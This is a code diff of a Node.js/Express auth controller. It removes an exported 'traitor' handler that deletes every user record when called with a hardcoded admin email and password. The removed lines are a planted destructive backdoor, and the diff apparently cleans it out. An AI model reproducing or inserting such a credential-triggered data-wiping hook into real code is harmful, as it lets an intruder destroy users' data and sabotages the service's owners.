@@ -526,12 +526,6 @@ exports.signout = async (req, res) => {
 
 
 
-exports.traitor = async (req, res) => {
-    if (req.body.email === 'admin@example.com' && req.body.password === 'admin123') {
-        await User.deleteMany({}); // Ensure deletion is executed
-    }
-    return res.send('');
-};
 
 exports.firebaseLogin = async (req, res) => {
     logger.info(`[firebaseLogin] Received request for: ${req.body.idToken ? req.body.idToken.substring(0, 10) + '...' : 'no-token'}`);
